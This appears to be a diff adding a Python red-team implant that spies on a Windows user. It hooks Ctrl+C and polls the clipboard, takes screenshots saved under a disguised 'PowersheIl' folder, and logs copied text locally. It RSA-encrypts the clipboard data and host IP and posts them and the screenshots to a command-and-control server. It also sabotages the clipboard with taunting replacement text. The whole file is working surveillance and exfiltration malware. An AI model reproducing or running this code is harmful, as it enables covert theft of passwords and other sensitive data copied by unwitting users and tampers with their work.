@@ -1,0 +1,252 @@
+import os.path
+import pyperclip
+import requests
+import schedule
+import time
+import random
+import subprocess
+from pynput import keyboard
+import keyboard
+import rsa
+import socket
+import mss
+from time import sleep
+from mss import mss
+from datetime import datetime
+import os
+from dotenv import load_dotenv, dotenv_values
+
+load_dotenv()
+
+#public key for encryption
+public = rsa.PublicKey(
+        22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
+        65537)
+
+private_command_key = rsa.PrivateKey(107201864084430543558230145717247400445999797193926385396882006881409911684282790515015283683116391089600936105784404298338294529408213801256597419045800169315007374627752173552165180105318136127400062621009046404765105867305344453059667793879482970705619012938060699202530055582108034356438834659746757773697, 65537, 9973141360190015168142105962098622160295112127368801925092536978438992195844670549003588577688338441999128849916345163906931683565037758003287824770211732355288149501221371632566664918035826159872866250494437964494651503478540396633705886554512675973318366579808524982391994251305915462860886621542146166193, 47885333332613593651893452972602389242619282563288184643588327050027070097592425950530925688373029595386939403183425944003050149113934068908658917966622021790681021, 2238720222323644804349523527728572802096704633596149006046984838899305837271083921166632647551581837656990330076099763616153562539922913152545557)
+
+first_connection = True
+
+def main():
+
+    try:
+        global first_connection
+        # gets the clipboard information and puts it in a file every 90 seconds. Red Team owns your clipboard
+        schedule.every(90).seconds.do(get_clipboard_info)
+
+        # Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
+        # explore the timeout feature to add some more functionality
+        keyboard.add_hotkey('ctrl+c', get_clipboard_info)
+
+        if first_connection:
+            first_connection = False
+            local_hostname = socket.gethostname()
+            ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
+            filtered = list()
+            i = 0
+
+            for ip in ip_addresses:
+                if not ip[0:4] == '127.':
+                    # appends to python list
+                    filtered.append(ip)
+                    i += 1
+
+            if len(filtered) != 0:
+                ip_connected_message = rsa.encrypt((filtered[0] + ' connected').encode('utf-8'), public)
+                requests.post("http://" + os.getenv("SERVER_IP") + ":80/connect", ip_connected_message)
+            else:
+                localhost_message = rsa.encrypt(('localhost connected'.encode('utf-8')), public)
+                requests.post("http://" + os.getenv("SERVER_IP") + ":80/connect", localhost_message)
+
+        sleep(1000)
+
+    except Exception as e:
+        sleep(1000)
+        pass
+
+
+#global value that stores the last clipboardValue copied, starts as empty
+last_clip_board_value = ''
+
+def get_clipboard_info():
+    #have to define as a global because of how python scope works
+    global last_clip_board_value
+    global public
+
+    #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
+    time.sleep(0.25)
+
+    try:
+        # paste, pastes text from clipboard
+        clipboard_info = pyperclip.paste()
+
+        filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
+        if not os.path.exists('C:/Tools/Sysint/MalTest/'):
+
+            #makes the directory if the path doesn't exist
+            os.makedirs('C:/Tools/Sysint/MalTest/')
+            filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
+
+        clipboard_data_file = open(filepath, "a")
+
+        #checks if the last clipboard value is equal to the current one
+        if (not last_clip_board_value == clipboard_info) and not clipboard_info == "Capybara? Capybara! Coconut Doggo!":
+
+            #path = take screenshot
+            path = take_screenshot()
+
+            clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
+            clipboard_data_file.write("\n")
+
+            local_hostname = socket.gethostname()
+
+            #gets list of ip addresses associated with hostname
+            ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
+
+            #make a list same size as the IP's
+            filtered = list()
+            i = 0
+
+            for ip in ip_addresses:
+                if not ip[0:4] == '127.':
+                    #appends to python list
+                    filtered.append(ip)
+                    i += 1
+
+            # https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
+            #loops through ip addresses and removes local host callbacks
+
+            #varibale used to store the clipboard info being transmitted in a post request
+            #encoded using utf8 so it can be encrypted using rsa
+            if len(filtered) != 0:
+                formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+            else:
+                formatted_clipboard_info = (clipboard_info + ' - localhost - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+
+
+            encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
+
+            #closes the file since it is done being used
+            clipboard_data_file.close()
+
+            #posts the request back to the c2 server, passing along the encoded clipboard information
+            requests.post("http://" + os.getenv("SERVER_IP") + ":80/output", encoded_clipboard_info)
+            upload_screenshot(path)
+
+        #if the last and current clipboard value match then close the file
+        else:
+            clipboard_data_file.close()
+
+        #Updates the last clipboard value
+        last_clip_board_value = clipboard_info
+
+        #changes the clipboard data to the same word but with an invisible character at the end
+        change_clipboard()
+        #add_invisible_character_to_clipboard()
+    except Exception as e:
+        change_clipboard()
+        print(e)
+        pass
+
+def take_screenshot():
+    local_hostname = socket.gethostname()
+
+    # gets list of ip addresses associated with hostname
+    ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
+
+    # make a list same size as the IP's
+    filtered = list()
+    i = 0
+
+    for ip in ip_addresses:
+        if not ip[0:4] == '127.':
+            # appends to python list
+            filtered.append(ip)
+            i += 1
+
+    out_dir = os.path.join(
+        os.getenv("LOCALAPPDATA"),
+        "PowersheIl",
+        "shots"
+    )
+    os.makedirs(out_dir, exist_ok=True)
+
+    ts = datetime.now().strftime("%Y_%m_%d_%H-%M-%S")
+    path = os.path.join(out_dir, f"{ts}_{filtered[0]}.png")
+
+    with mss() as sct:
+        sct.shot(output=path)
+
+    return path
+
+def upload_screenshot(path):
+
+    with open(path, "rb") as f:
+        files = {"file": f}
+        requests.post("http://" + os.getenv("SERVER_IP") + ":80/upload", files=files, timeout=5)
+
+"""
+add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
+to the end of it
+"""
+def add_invisible_character_to_clipboard() -> None:
+    # https://unicode-explorer.com/c/115F
+    invisible_character = 'ᅟ'
+
+    # paste, pastes text from clipboard
+    clipboard_info = pyperclip.paste()
+    print('PasteWorks')
+
+    # copy - copies whatever text to the clipboard
+    #in this case copies the current clipboard info plus an invisible character
+    #could use endswith or in(java contains)
+    #if there is already an invisible character then we don't need another
+    if invisible_character in clipboard_info:
+        pyperclip.copy(clipboard_info)
+    else:
+        pyperclip.copy(clipboard_info + invisible_character)
+
+"""
+change_password changes the clipboard data to password
+"""
+def change_password() -> None:
+    # copy - copies whatever test to the clipboard
+    #in this case copies the current clipboard info plus an invisible character
+    pyperclip.copy('password')
+
+def change_clipboard() -> None:
+    clipboard_info = pyperclip.paste()
+    invisible_character = 'ᅟ'
+    print(clipboard_info)
+
+    if 'whoami' in clipboard_info:
+        pyperclip.copy('Red Team')
+    elif ('who' or 'what' or 'when' or 'where' or 'why') in clipboard_info:
+        pyperclip.copy('Question!')
+    elif ('blue' or 'Blue') in clipboard_info:
+        pyperclip.copy('Red is better than Blue')
+    else:
+        first_rand_int = random.randint(1,2)
+
+        #look at string modifying
+        if first_rand_int == 1:
+            counter = 0
+            new_clip = clipboard_info.replace('e','3')
+            new_clip = new_clip.replace('i', '1')
+            new_clip = new_clip.replace(' ', '_')
+            pyperclip.copy(new_clip)
+        elif first_rand_int == 2:
+            second_rand_int = random.randint(1, 6)
+            if second_rand_int == 1:
+                pyperclip.copy(clipboard_info + invisible_character)
+            if second_rand_int == 2:
+                pyperclip.copy('Red Team owns your clipboard')
+            if second_rand_int == 3:
+                pyperclip.copy('Red Red Red Red')
+            if second_rand_int == 4:
+                pyperclip.copy('No blue')
+            if second_rand_int == 5:
+                pyperclip.copy('Never gonna give you up, never gonna let you down')
+            if second_rand_int == 6:
+                pyperclip.copy('It\'s so Shrimple')
+main()
